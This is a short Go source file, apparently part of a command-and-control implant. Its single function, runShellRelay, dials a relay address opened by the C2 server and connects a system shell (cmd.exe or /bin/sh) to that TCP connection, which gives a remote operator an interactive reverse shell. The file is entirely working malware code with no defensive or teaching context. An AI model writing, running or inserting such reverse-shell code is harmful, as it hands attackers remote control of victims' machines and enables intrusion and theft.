package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// runShellRelay starts the system shell with its stdin/stdout/stderr connected
// directly to the relay TCP address.  Used by TaskShell to give the operator
// an interactive shell without going through the encrypted task channel.
//
// Flow:
//  1. Dial relayAddr — the ephemeral listener the C2 opened.
//  2. Start the shell subprocess with conn as its stdio.
//  3. Block until the shell exits (user typed 'exit') or the relay conn closes.
func runShellRelay(relayAddr string) error {
	conn, err := net.DialTimeout("tcp", relayAddr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("shell: dial relay %s: %w", relayAddr, err)
	}

	shell := systemShell
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = "cmd.exe"
		} else {
			shell = "/bin/sh"
		}
	}
	parts := strings.Fields(shell)
	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		conn.Close()
		return fmt.Errorf("shell: start %s: %w", parts[0], err)
	}

	// Block until the shell exits.  When the C2 closes the relay conn,
	// the shell's stdin gets EOF and most shells exit on their own.
	// When the user types 'exit', the shell exits and we close the conn.
	cmd.Wait() //nolint:errcheck
	conn.Close()
	return nil
}
